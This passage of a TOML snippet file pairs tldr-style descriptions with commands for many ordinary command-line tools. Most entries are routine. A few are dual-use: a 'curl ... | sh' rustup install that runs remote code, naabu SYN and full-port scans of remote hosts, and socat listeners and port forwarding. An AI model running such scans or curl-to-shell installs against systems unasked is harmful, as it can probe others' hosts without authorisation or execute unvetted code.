  description = "Paste a PNM image into another PNM image at the specified coordinates"
  command = "pnmpaste <x> <y> <path/to/image1.pnm> <path/to/image2.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Paste the image read from `stdin` into the specified image"
  command = "<command> | pnmpaste <x> <y> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Combine the overlapping pixels by the specified boolean operation, where white pixels represent `true` while black pixels represent `false`"
  command = "pnmpaste -<and|nand|or|nor|xor|xnor> <x> <y> <path/to/image1.pnm> <path/to/image2.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Rebuild with `make` if any file changes"
  command = "reflex make"
  output = ""

[[snippets]]
  description = "Compile and run Go application if any `.go` file changes"
  command = "reflex --regex='<\.go$>' <go run .>"
  output = ""

[[snippets]]
  description = "Ignore a directory when watching for changes"
  command = "reflex --inverse-regex='<^dir/>' <command>"
  output = ""

[[snippets]]
  description = "Run command when reflex starts and restarts on file changes"
  command = "reflex --start-service=true <command>"
  output = ""

[[snippets]]
  description = "Substitute the filename that changed in"
  command = "reflex -- echo {}"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr gnmic subscribe"
  output = ""

[[snippets]]
  description = "Execute a Java `.class` file that contains a main method by using just the class name"
  command = "java <classname>"
  output = ""

[[snippets]]
  description = "Execute a Java program and use additional third-party or user-defined classes"
  command = "java -classpath <path/to/classes1>:<path/to/classes2>:. <classname>"
  output = ""

[[snippets]]
  description = "Execute a `.jar` program"
  command = "java -jar <filename.jar>"
  output = ""

[[snippets]]
  description = "Execute a `.jar` program with debug waiting to connect on port 5005"
  command = "java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=*:5005 -jar <filename.jar>"
  output = ""

[[snippets]]
  description = "Display JDK, JRE and HotSpot versions"
  command = "java -version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "java -help"
  output = ""

[[snippets]]
  description = "List all the aliases `gh` is configured to use"
  command = "gh alias list"
  output = ""

[[snippets]]
  description = "Create a `gh` subcommand alias"
  command = "gh alias set <pv> '<pr view>'"
  output = ""

[[snippets]]
  description = "Set a shell command as a `gh` subcommand"
  command = "gh alias set --shell <alias_name> <command>"
  output = ""

[[snippets]]
  description = "Delete a command shortcut"
  command = "gh alias delete <alias_name>"
  output = ""

[[snippets]]
  description = "Display the subcommand help"
  command = "gh alias"
  output = ""

[[snippets]]
  description = "Install a specific version of Node.js"
  command = "nvm install <node_version>"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js in the current shell"
  command = "nvm use <node_version>"
  output = ""

[[snippets]]
  description = "Set the default Node.js version"
  command = "nvm alias default <node_version>"
  output = ""

[[snippets]]
  description = "List all available Node.js versions and highlight the default one"
  command = "nvm list"
  output = ""

[[snippets]]
  description = "Uninstall a given Node.js version"
  command = "nvm uninstall <node_version>"
  output = ""

[[snippets]]
  description = "Launch the REPL of a specific version of Node.js"
  command = "nvm run <node_version> --version"
  output = ""

[[snippets]]
  description = "Execute a script in a specific version of Node.js"
  command = "nvm exec <node_version> node <app.js>"
  output = ""

[[snippets]]
  description = "Render specific local pages"
  command = "clip-view <path/to/page1.clip path/to/page2.clip ...>"
  output = ""

[[snippets]]
  description = "Render specific remote pages"
  command = "clip-view <page_name1 page_name2 ...>"
  output = ""

[[snippets]]
  description = "Render pages by a specific render"
  command = "clip-view --render <tldr|tldr-colorful|docopt|docopt-colorful> <page_name1 page_name2 ...>"
  output = ""

[[snippets]]
  description = "Render pages with a specific color theme"
  command = "clip-view --theme <path/to/local_theme.yaml|remote_theme_name> <page_name1 page_name2 ...>"
  output = ""

[[snippets]]
  description = "Clear a page or theme cache"
  command = "clip-view --clear-<page|theme>-cache"
  output = ""

[[snippets]]
  description = "Display help"
  command = "clip-view --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "clip-view --version"
  output = ""

[[snippets]]
  description = "Exit with the exit status of the most recently executed command"
  command = "exit"
  output = ""

[[snippets]]
  description = "Exit with a specific exit status"
  command = "exit <exit_code>"
  output = ""

[[snippets]]
  description = "Create a basic cluster"
  command = "eksctl create cluster"
  output = ""

[[snippets]]
  description = "List the details about a cluster or all of the clusters"
  command = "eksctl get cluster --name=<name> --region=<region>"
  output = ""

[[snippets]]
  description = "Create a cluster passing all configuration information in a file"
  command = "eksctl create cluster --config-file=<path/to/file>"
  output = ""

[[snippets]]
  description = "Create a cluster using a configuration file and skip creating nodegroups until later"
  command = "eksctl create cluster --config-file=<path> --without-nodegroup"
  output = ""

[[snippets]]
  description = "Delete a cluster"
  command = "eksctl delete cluster --name=<name> --region=<region>"
  output = ""

[[snippets]]
  description = "Create cluster and write cluster credentials to a file other than the default"
  command = "eksctl create cluster --name=<name> --nodes=<4> --kubeconfig=<path/to/config.yaml>"
  output = ""

[[snippets]]
  description = "Create a cluster and prevent storing cluster credentials locally"
  command = "eksctl create cluster --name=<name> --nodes=<4> --write-kubeconfig=false"
  output = ""

[[snippets]]
  description = "Create a cluster and let `eksctl` manage cluster credentials under the `~/.kube/eksctl/clusters` directory"
  command = "eksctl create cluster --name=<name> --nodes=<4> --auto-kubeconfig"
  output = ""

[[snippets]]
  description = "Start DockerSlim on interactive mode"
  command = "docker-slim"
  output = ""

[[snippets]]
  description = "Analyze Docker layers from a specific image"
  command = "docker-slim xray --target <image:tag>"
  output = ""

[[snippets]]
  description = "Lint a Dockerfile"
  command = "docker-slim lint --target <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Analyze and generate an optimized Docker image"
  command = "docker-slim build <image:tag>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "docker-slim <subcommand> --help"
  output = ""

[[snippets]]
  description = "Start a new game"
  command = "openttd -g"
  output = ""

[[snippets]]
  description = "Load save game at start"
  command = "openttd -g <path/to/file>"
  output = ""

[[snippets]]
  description = "Start with the specified window resolution"
  command = "openttd -r <1920x1080>"
  output = ""

[[snippets]]
  description = "Start with a custom configuration file"
  command = "openttd -c <path/to/file>"
  output = ""

[[snippets]]
  description = "Start with selected video, sound, and music drivers"
  command = "openttd -v <video_driver> -s <sound_driver> -m <music_driver>"
  output = ""

[[snippets]]
  description = "Start a dedicated server, forked in the background"
  command = "openttd -f -D <host>:<port>"
  output = ""

[[snippets]]
  description = "Join a server with a password"
  command = "openttd -n <host>:<port>#<player_name> -p <password>"
  output = ""

[[snippets]]
  description = "Update all TeX Live packages"
  command = "sudo tlmgr update --all"
  output = ""

[[snippets]]
  description = "Update tlmgr itself"
  command = "sudo tlmgr update --self"
  output = ""

[[snippets]]
  description = "Update a specific package"
  command = "sudo tlmgr update <package>"
  output = ""

[[snippets]]
  description = "Update all except a specific package"
  command = "sudo tlmgr update --all --exclude <package>"
  output = ""

[[snippets]]
  description = "Update all packages, making a backup of the current packages"
  command = "sudo tlmgr update --all --backup"
  output = ""

[[snippets]]
  description = "Update a specific package without updating its dependencies"
  command = "sudo tlmgr update --no-depends <package>"
  output = ""

[[snippets]]
  description = "Simulate updating all packages without making any changes"
  command = "sudo tlmgr update --all --dry-run"
  output = ""

[[snippets]]
  description = "Subscribe to the topic `sensors/temperature` information with Quality of Service (`QoS`) set to 1. (The default hostname is `localhost` and port 1883)"
  command = "mosquitto_sub -t <sensors/temperature> -q <1>"
  output = ""

[[snippets]]
  description = "Subscribe to all broker status messages publishing on `iot.eclipse.org` port 1885 and print published messages verbosely"
  command = "mosquitto_sub -v -h ""iot.eclipse.org"" -p 1885 -t <\$SYS/#>"
  output = ""

[[snippets]]
  description = "Subscribe to multiple topics matching a given pattern. (+ takes any metric name)"
  command = "mosquitto_sub -t <sensors/machines/+/temperature/+>"
  output = ""

[[snippets]]
  description = "Lint all pages"
  command = "tldr-lint <pages_directory>"
  output = ""

[[snippets]]
  description = "Format a specific page to `stdout`"
  command = "tldr-lint --format <page.md>"
  output = ""

[[snippets]]
  description = "Format all pages in place"
  command = "tldr-lint --format --in-place <pages_directory>"
  output = ""

[[snippets]]
  description = "Start an Android emulator device"
  command = "emulator -avd <name>"
  output = ""

[[snippets]]
  description = "Display the webcams on your development computer that are available for emulation"
  command = "emulator -avd <name> -webcam-list"
  output = ""

[[snippets]]
  description = "Start an emulator overriding the facing back camera setting (use `-camera-front` for front camera)"
  command = "emulator -avd <name> -camera-back <none|emulated|webcamN>"
  output = ""

[[snippets]]
  description = "Start an emulator, with a maximum network speed"
  command = "emulator -avd <name> -netspeed <gsm|hscsd|gprs|edge|hsdpa|lte|evdo|full>"
  output = ""

[[snippets]]
  description = "Start an emulator with network latency"
  command = "emulator -avd <name> -netdelay <gsm|hscsd|gprs|edge|hsdpa|lte|evdo|none>"
  output = ""

[[snippets]]
  description = "Start an emulator, making all TCP connections through a specified HTTP/HTTPS proxy (port number is required)"
  command = "emulator -avd <name> -http-proxy <http://example.com:80>"
  output = ""

[[snippets]]
  description = "Start an emulator with a given SD card partition image file"
  command = "emulator -avd <name> -sdcard <path/to/sdcard.img>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "emulator -help"
  output = ""

[[snippets]]
  description = "List IPP printers registered on the network with their status"
  command = "ippfind --ls"
  output = ""

[[snippets]]
  description = "Send a specific PostScript document to every PostScript printer on the network"
  command = "ippfind --txt-pdl application/postscript --exec ipptool -f <path/to/document.ps> '{}' print-job.test \;"
  output = ""

[[snippets]]
  description = "Send a PostScript test document to every PostScript printer on the network"
  command = "ippfind --txt-pdl application/postscript --exec ipptool -f onepage-letter.ps '{}' print-job.test \;"
  output = ""

[[snippets]]
  description = "Send a PostScript test document to every PostScript printer on the network, whose name matches a regular expression"
  command = "ippfind --txt-pdl application/postscript --host <regex> --exec ipptool -f onepage-letter.ps '{}' print-job.test \;"
  output = ""

[[snippets]]
  description = "Look for patterns in the database (recomputed periodically)"
  command = "plocate <pattern>"
  output = ""

[[snippets]]
  description = "Look for a file by its exact filename (a pattern containing no globbing characters is interpreted as `*pattern*`)"
  command = "plocate */<filename>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzcmp"
  output = ""

[[snippets]]
  description = "Open the remote control console"
  command = "birdc"
  output = ""

[[snippets]]
  description = "Reload the configuration without restarting BIRD"
  command = "birdc configure"
  output = ""

[[snippets]]
  description = "Show the current status of BIRD"
  command = "birdc show status"
  output = ""

[[snippets]]
  description = "Show all configured protocols"
  command = "birdc show protocols"
  output = ""

[[snippets]]
  description = "Show all details about a protocol"
  command = "birdc show protocols <upstream1> all"
  output = ""

[[snippets]]
  description = "Show all routes that contain a specific AS number"
  command = "birdc ""show route where bgp_path ~ [<4242120045>]"""
  output = ""

[[snippets]]
  description = "Show all best routes"
  command = "birdc show route primary"
  output = ""

[[snippets]]
  description = "Show all details of all routes from a given prefix"
  command = "birdc show route for <fd00:/8> all"
  output = ""

[[snippets]]
  description = "List AKS clusters"
  command = "az aks list --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Create a new AKS cluster"
  command = "az aks create --resource-group <resource_group> --name <name> --node-count <count> --node-vm-size <size>"
  output = ""

[[snippets]]
  description = "Delete an AKS cluster"
  command = "az aks delete --resource-group <resource_group> --name <name>"
  output = ""

[[snippets]]
  description = "Get the access credentials for an AKS cluster"
  command = "az aks get-credentials --resource-group <resource_group> --name <name>"
  output = ""

[[snippets]]
  description = "Get the upgrade versions available for an AKS cluster"
  command = "az aks get-upgrades --resource-group <resource_group> --name <name>"
  output = ""

[[snippets]]
  description = "Update to the tip of the current branch"
  command = "hg update"
  output = ""

[[snippets]]
  description = "Update to the specified revision"
  command = "hg update --rev <revision>"
  output = ""

[[snippets]]
  description = "Update and discard uncommitted changes"
  command = "hg update --clean"
  output = ""

[[snippets]]
  description = "Update to the last commit matching a specified date"
  command = "hg update --date <dd-mm-yyyy>"
  output = ""

[[snippets]]
  description = "Create a torrent with 2^21 KB as the piece size"
  command = "mktorrent -a <tracker_announce_url> -l <21> -o <path/to/example.torrent> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a private torrent with a 2^21 KB piece size"
  command = "mktorrent -p -a <tracker_announce_url> -l <21> -o <path/to/example.torrent> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a torrent with a comment"
  command = "mktorrent -c ""<comment>"" -a <tracker_announce_url> -l <21> -o <path/to/example.torrent> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a torrent with multiple trackers"
  command = "mktorrent -a <tracker_announce_url,tracker_announce_url_2> -l <21> -o <path/to/example.torrent> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a torrent with web seed URLs"
  command = "mktorrent -a <tracker_announce_url> -w <web_seed_url> -l <21> -o <path/to/example.torrent> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a Palm bitmap"
  command = "pnmtopalm <path/to/file.pnm> > <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "Specify the color depth of the resulting bitmap"
  command = "pnmtopalm -depth <1|2|4|8|16> <path/to/file.pnm> > <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "Choose a compression method for the resulting bitmap"
  command = "pnmtopalm -<scanline_compression|rle_compression|packbits_compression> <path/to/file.pnm> > <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "Build a custom colormap and include it in the resulting bitmap"
  command = "pnmtopalm -colormap <path/to/file.pnm> > <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "Specify the bitmap's density"
  command = "pnmtopalm -density <72|108|144|216|288> <path/to/file.pnm> > <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "List all repos in a specific project"
  command = "az repos list --project <project_name>"
  output = ""

[[snippets]]
  description = "Add policy on a specific branch of a specific repository to restrict basic merge"
  command = "az repos policy merge-strategy create --repository-id <repository_id_in_repos_list> --branch <branch_name> --blocking --enabled --allow-no-fast-forward false --allow-rebase true --allow-rebase-merge true --allow-squash true"
  output = ""

[[snippets]]
  description = "Add build validation on a specific repository, using an existing build pipeline, to be triggered automatically on source update"
  command = "az repos policy build create --repository-id <repository_id> --build-definition-id <build_pipeline_id> --branch main --blocking --enabled --queue-on-source-update-only true --display-name <name> --valid-duration <minutes>"
  output = ""

[[snippets]]
  description = "List all active Pull Requests on a specific repository within a specific project"
  command = "az repos pr list --project <project_name> --repository <repository_name> --status active"
  output = ""

[[snippets]]
  description = "List all discoverable fonts in the system and the given directory"
  command = "typst --font-path <path/to/fonts_directory> fonts"
  output = ""

[[snippets]]
  description = "Compile a Typst file"
  command = "typst compile <path/to/source.typ> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Watch a Typst file and recompile on changes"
  command = "typst watch <path/to/source.typ> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Find the commit the patch applies to and do a rebase"
  command = "git rebase-patch <patch_file>"
  output = ""

[[snippets]]
  description = "Create a new wallet"
  command = "electrum -w <new_wallet.dat> create"
  output = ""

[[snippets]]
  description = "Restore an existing wallet from seed offline"
  command = "electrum -w <recovery_wallet.dat> restore -o"
  output = ""

[[snippets]]
  description = "Create a signed transaction offline"
  command = "electrum mktx <recipient> <amount> -f 0.0000001 -F <from> -o"
  output = ""

[[snippets]]
  description = "Display all wallet receiving addresses"
  command = "electrum listaddresses -a"
  output = ""

[[snippets]]
  description = "Sign a message"
  command = "electrum signmessage <address> <message>"
  output = ""

[[snippets]]
  description = "Verify a message"
  command = "electrum verifymessage <address> <signature> <message>"
  output = ""

[[snippets]]
  description = "Connect only to a specific electrum-server instance"
  command = "electrum -p socks5:<127.0.0.1>:9050 -s <56ckl5obj37gypcu.onion>:50001:t -1"
  output = ""

[[snippets]]
  description = "Cut a file"
  command = "xcv x <input_file>"
  output = ""

[[snippets]]
  description = "Copy a file"
  command = "xcv c <input_file>"
  output = ""

[[snippets]]
  description = "Paste a file"
  command = "xcv v <output_file>"
  output = ""

[[snippets]]
  description = "List files available for pasting"
  command = "xcv l"
  output = ""

[[snippets]]
  description = "Print the specified number of words"
  command = "lorem -n <20>"
  output = ""

[[snippets]]
  description = "Print 10 lines of Goethe's Faust"
  command = "lorem -l <10> --faust"
  output = ""

[[snippets]]
  description = "Print 5 sentences of Poe's Raven"
  command = "lorem -s <5> --raven"
  output = ""

[[snippets]]
  description = "Print 40 random characters from Boccaccio's Decameron"
  command = "lorem --randomize -c <40> --decamerone"
  output = ""

[[snippets]]
  description = "Ping host"
  command = "ping <host>"
  output = ""

[[snippets]]
  description = "Ping a host only a specific number of times"
  command = "ping -c <count> <host>"
  output = ""

[[snippets]]
  description = "Ping host, specifying the interval in seconds between requests (default is 1 second)"
  command = "ping -i <seconds> <host>"
  output = ""

[[snippets]]
  description = "Ping host without trying to lookup symbolic names for addresses"
  command = "ping -n <host>"
  output = ""

[[snippets]]
  description = "Ping host and ring the bell when a packet is received (if your terminal supports it)"
  command = "ping -a <host>"
  output = ""

[[snippets]]
  description = "Also display a message if no response was received"
  command = "ping -O <host>"
  output = ""

[[snippets]]
  description = "Listen to a port, wait for an incoming connection and transfer data to STDIO"
  command = "socat - TCP-LISTEN:8080,fork"
  output = ""

[[snippets]]
  description = "Listen on a port using SSL and print to STDOUT"
  command = "socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT"
  output = ""

[[snippets]]
  description = "Create a connection to a host and port, transfer data in STDIO to connected host"
  command = "socat - TCP4:www.example.com:80"
  output = ""

[[snippets]]
  description = "Forward incoming data of a local port to another host and port"
  command = "socat TCP-LISTEN:80,fork TCP4:www.example.com:80"
  output = ""

[[snippets]]
  description = "Tile the input image xtiles by ytiles times, increasing the offset each time as determined by xdelta and ydelta"
  command = "pampop9 <path/to/input.pam> <xtiles> <ytiles> <xdelta> <ydelta> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Run the server with a specific service name"
  command = "ippeveprinter ""<service_name>"""
  output = ""

[[snippets]]
  description = "Load printer attributes from a PPD file"
  command = "ippeveprinter -P <path/to/file.ppd> ""<service_name>"""
  output = ""

[[snippets]]
  description = "Run the `file` command whenever a job is sent to the server"
  command = "ippeveprinter -c </usr/bin/file> ""<service_name>"""
  output = ""

[[snippets]]
  description = "Specify the directory that will hold the print files (by default, a directory under the user's temporary directory)"
  command = "ippeveprinter -d <spool_directory> ""<service_name>"""
  output = ""

[[snippets]]
  description = "Keep the print documents in the spool directory rather than deleting them"
  command = "ippeveprinter -k ""<service_name>"""
  output = ""

[[snippets]]
  description = "Specify the printer speed in pages/minute unit (10 by default)"
  command = "ippeveprinter -s <speed> ""<service_name>"""
  output = ""

[[snippets]]
  description = "Replicate an image to fill an area of the specified dimensions"
  command = "pnmtile <width> <height> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Stop a virtual machine immediately"
  command = "qm stop <VM_ID>"
  output = ""

[[snippets]]
  description = "Stop a virtual machine and wait for at most 10 seconds"
  command = "qm stop --timeout <10> <VM_ID>"
  output = ""

[[snippets]]
  description = "Stop a virtual machine and skip lock (only root can use this option)"
  command = "qm stop --skiplock <true> <VM_ID>"
  output = ""

[[snippets]]
  description = "Stop a virtual machine and don't deactivate storage volumes"
  command = "qm stop --keepActive <true> <VM_ID>"
  output = ""

[[snippets]]
  description = "Reset a file to HEAD"
  command = "git reset-file <path/to/file>"
  output = ""

[[snippets]]
  description = "Reset a file to a specific commit"
  command = "git reset-file <path/to/file> <commit_hash>"
  output = ""

[[snippets]]
  description = "Unmount a filesystem, by passing the path to the source it is mounted from"
  command = "umount <path/to/device_file>"
  output = ""

[[snippets]]
  description = "Unmount a filesystem, by passing the path to the target where it is mounted"
  command = "umount <path/to/mounted_directory>"
  output = ""

[[snippets]]
  description = "Unmount all mounted filesystems (except the `proc` filesystem)"
  command = "umount -a"
  output = ""

[[snippets]]
  description = "Migrate project dependencies to the AndroidX format"
  command = "jetifier"
  output = ""

[[snippets]]
  description = "Migrate project dependencies from the AndroidX format"
  command = "jetifier reverse"
  output = ""

[[snippets]]
  description = "Display the entire revision history of the repository"
  command = "hg log"
  output = ""

[[snippets]]
  description = "Display the revision history with an ASCII graph"
  command = "hg log --graph"
  output = ""

[[snippets]]
  description = "Display the revision history with file names matching a specified pattern"
  command = "hg log --include <pattern>"
  output = ""

[[snippets]]
  description = "Display the revision history, excluding file names that match a specified pattern"
  command = "hg log --exclude <pattern>"
  output = ""

[[snippets]]
  description = "Display the log information for a specific revision"
  command = "hg log --rev <revision>"
  output = ""

[[snippets]]
  description = "Display the revision history for a specific branch"
  command = "hg log --branch <branch>"
  output = ""

[[snippets]]
  description = "Display the revision history for a specific date"
  command = "hg log --date <date>"
  output = ""

[[snippets]]
  description = "Display revisions committed by a specific user"
  command = "hg log --user <user>"
  output = ""

[[snippets]]
  description = "Run tests with default configuration or as configured in `mocha.opts`"
  command = "mocha"
  output = ""

[[snippets]]
  description = "Run tests contained at a specific location"
  command = "mocha <directory/with/tests>"
  output = ""

[[snippets]]
  description = "Run tests that match a specific `grep` pattern"
  command = "mocha --grep <regular_expression>"
  output = ""

[[snippets]]
  description = "Run tests on changes to JavaScript files in the current directory and once initially"
  command = "mocha --watch"
  output = ""

[[snippets]]
  description = "Run tests with a specific reporter"
  command = "mocha --reporter <reporter>"
  output = ""

[[snippets]]
  description = "Start the interactive console interface"
  command = "deluge-console"
  output = ""

[[snippets]]
  description = "Connect to a Deluge daemon instance"
  command = "connect <hostname>:<port>"
  output = ""

[[snippets]]
  description = "Add a torrent to the daemon"
  command = "add <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Display information about all torrents"
  command = "info"
  output = ""

[[snippets]]
  description = "Display information about a specific torrent"
  command = "info <torrent_id>"
  output = ""

[[snippets]]
  description = "Pause a torrent"
  command = "pause <torrent_id>"
  output = ""

[[snippets]]
  description = "Resume a torrent"
  command = "resume <torrent_id>"
  output = ""

[[snippets]]
  description = "Remove a torrent from the daemon"
  command = "rm <torrent_id>"
  output = ""

[[snippets]]
  description = "Display metadata for a specific torrent"
  command = "transmission-show <path/to/file.torrent>"
  output = ""

[[snippets]]
  description = "Generate a magnet link for a specific torrent"
  command = "transmission-show --magnet <path/to/file.torrent>"
  output = ""

[[snippets]]
  description = "Query a torrent's trackers and print the current number of peers"
  command = "transmission-show --scrape <path/to/file.torrent>"
  output = ""

[[snippets]]
  description = "Stash an enqueued task"
  command = "pueue stash <task_id>"
  output = ""

[[snippets]]
  description = "Stash multiple tasks at once"
  command = "pueue stash <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Start a stashed task immediately"
  command = "pueue start <task_id>"
  output = ""

[[snippets]]
  description = "Enqueue a task to be executed when preceding tasks finish"
  command = "pueue enqueue <task_id>"
  output = ""

[[snippets]]
  description = "Optimise the repository"
  command = "git gc"
  output = ""

[[snippets]]
  description = "Aggressively optimise, takes more time"
  command = "git gc --aggressive"
  output = ""

[[snippets]]
  description = "Do not prune loose objects (prunes by default)"
  command = "git gc --no-prune"
  output = ""

[[snippets]]
  description = "Suppress all output"
  command = "git gc --quiet"
  output = ""

[[snippets]]
  description = "Display help"
  command = "git gc --help"
  output = ""

[[snippets]]
  description = "Open the current directory in Sublime Text"
  command = "subl <.>"
  output = ""

[[snippets]]
  description = "Open a file or directory in Sublime Text"
  command = "subl <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Open a file and jump to a specific line number"
  command = "subl <path/to/file>:<line_number>"
  output = ""

[[snippets]]
  description = "Open a file or directory in the currently open window"
  command = "subl -a <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file or directory in a new window"
  command = "subl -n <path/to/file>"
  output = ""

[[snippets]]
  description = "Boot from image emulating i386 architecture"
  command = "qemu-system-i386 -hda <image_name.img>"
  output = ""

[[snippets]]
  description = "Boot from image emulating x64 architecture"
  command = "qemu-system-x86_64 -hda <image_name.img>"
  output = ""

[[snippets]]
  description = "Boot QEMU instance with a live ISO image"
  command = "qemu-system-i386 -hda <image_name.img> -cdrom <os_image.iso> -boot d"
  output = ""

[[snippets]]
  description = "Specify amount of RAM for instance"
  command = "qemu-system-i386 -m 256 -hda image_name.img -cdrom os-image.iso -boot d"
  output = ""

[[snippets]]
  description = "Boot from physical device (e.g. from USB to test bootable medium)"
  command = "qemu-system-i386 -hda /dev/<storage_device>"
  output = ""

[[snippets]]
  description = "Create a vector dataset with contour lines spread over an 100-meter [i]nterval while [a]ttributing the elevation property as "ele""
  command = "gdal_contour -a <ele> -i <100.0> <path/to/input.tif> <path/to/output.gpkg>"
  output = ""

[[snippets]]
  description = "Create a vector dataset with [p]olygons spread over an 100-meter [i]nterval"
  command = "gdal_contour -i <100.0> -p <path/to/input.tif> <path/to/output.gpkg>"
  output = ""

[[snippets]]
  description = "Generate a text report from a specific profiling file, on fibbo binary"
  command = "pprof -top <./fibbo> <./fibbo-profile.pb.gz>"
  output = ""

[[snippets]]
  description = "Generate a graph and open it on a web browser"
  command = "pprof -svg <./fibbo> <./fibbo-profile.pb.gz>"
  output = ""

[[snippets]]
  description = "Run pprof in interactive mode to be able to manually launch `pprof` on a file"
  command = "pprof <./fibbo> <./fibbo-profile.pb.gz>"
  output = ""

[[snippets]]
  description = "Run a web server that serves a web interface on top of `pprof`"
  command = "pprof -http=<localhost:8080> <./fibbo> <./fibbo-profile.pb.gz>"
  output = ""

[[snippets]]
  description = "Fetch a profile from an HTTP server and generate a report"
  command = "pprof <http://localhost:8080/debug/pprof>"
  output = ""

[[snippets]]
  description = "Run a command as root"
  command = "doas <command>"
  output = ""

[[snippets]]
  description = "Run a command as another user"
  command = "doas -u <user> <command>"
  output = ""

[[snippets]]
  description = "Launch the default shell as root"
  command = "doas -s"
  output = ""

[[snippets]]
  description = "Parse a configuration file and check if the execution of a command as another user is allowed"
  command = "doas -C <config_file> <command>"
  output = ""

[[snippets]]
  description = "Make `doas` request a password even after it was supplied earlier"
  command = "doas -L"
  output = ""

[[snippets]]
  description = "Package a web page"
  command = "pake <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Package a web page with a specific window size"
  command = "pake --width <800> --height <600> <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Package a web page with a custom application name and icon"
  command = "pake --name <Google> --icon <path/to/icon.ico> <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Package a web page with a non-resizable window"
  command = "pake --no-resizable <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Package a web page with fullscreen mode"
  command = "pake --fullscreen <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Package a web page with a transparent title bar"
  command = "pake --transparent <https://www.google.com/>"
  output = ""

[[snippets]]
  description = "Build a recursive fls list over a device, output paths will start with C"
  command = "fls -r -m <C:> </dev/loop1p1>"
  output = ""

[[snippets]]
  description = "Analyze a single partition, providing the sector offset at which the filesystem starts in the image"
  command = "fls -r -m <C:> -o <sector> <path/to/image_file>"
  output = ""

[[snippets]]
  description = "Analyze a single partition, providing the timezone of the original system"
  command = "fls -r -m <C:> -z <timezone> </dev/loop1p1>"
  output = ""

[[snippets]]
  description = "Convert PBM image to PGM by averaging the `w`x`h`-sized area surrounding each pixel"
  command = "pbmtopgm <w> <h> <path/to/image.pbm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Run a SYN scan against default (top 100) ports of remote host"
  command = "sudo naabu -host <host>"
  output = ""

[[snippets]]
  description = "Display available network interfaces and public IP address of the local host"
  command = "naabu -interface-list"
  output = ""

[[snippets]]
  description = "Scan all ports of the remote host (CONNECT scan without `sudo`)"
  command = "naabu -p - -host <host>"
  output = ""

[[snippets]]
  description = "Scan the top 1000 ports of the remote host"
  command = "naabu -top-ports 1000 -host <host>"
  output = ""

[[snippets]]
  description = "Scan TCP ports 80, 443 and UDP port 53 of the remote host"
  command = "naabu -p 80,443,u:53 -host <host>"
  output = ""

[[snippets]]
  description = "Show CDN type the remote host is using, if any"
  command = "naabu -p 80,443 -cdn -host <host>"
  output = ""

[[snippets]]
  description = "Run `nmap` from `naabu` for additional functionalities (`nmap` must be installed)"
  command = "sudo naabu -v -host <host> -nmap-cli 'nmap <-v -T5 -sC>'"
  output = ""

[[snippets]]
  description = "Download and run `rustup-init` to install `rustup` and the default Rust toolchain"
  command = "curl https://sh.rustup.rs -sSf | sh -s"
  output = ""

[[snippets]]
  description = "Download and run `rustup-init` and pass arguments to it"
  command = "curl https://sh.rustup.rs -sSf | sh -s -- <arguments>"
  output = ""

[[snippets]]
  description = "Run `rustup-init` and specify additional components or targets to install"
  command = "rustup-init.sh --target <target> --component <component>"
  output = ""

[[snippets]]
  description = "Run `rustup-init` and specify the default toolchain to install"
  command = "rustup-init.sh --default-toolchain <toolchain>"
  output = ""

[[snippets]]
  description = "Run `rustup-init` and do not install any toolchain"
  command = "rustup-init.sh --default-toolchain <none>"
  output = ""

[[snippets]]
  description = "Run `rustup-init` and specify an installation profile"
  command = "rustup-init.sh --profile <minimal|default|complete>"
  output = ""

[[snippets]]
  description = "Run `rustup-init` without asking for confirmation"
  command = "rustup-init.sh -y"
  output = ""

[[snippets]]
  description = "Run in portable mode"
  command = "QOwnNotes --portable"
  output = ""

[[snippets]]
  description = "Dump settings and other information about the app and environment in GitHub Markdown"
  command = "QOwnNotes --dump-settings"
  output = ""

[[snippets]]
  description = "Specify a different context for settings and internal files"
  command = "QOwnNotes --session <test>"
  output = ""

[[snippets]]
  description = "Trigger a menu action after the application was started"
  command = "QOwnNotes --action <actionShow_Todo_List>"
  output = ""

[[snippets]]
  description = "Initialize a configuration file"
  command = "atoum --init"
  output = ""

[[snippets]]
  description = "Run all tests"
  command = "atoum"
  output = ""

[[snippets]]
  description = "Run tests using the specified [c]onfiguration file"
  command = "atoum -c <path/to/file>"
  output = ""

[[snippets]]
  description = "Run a specific test [f]ile"
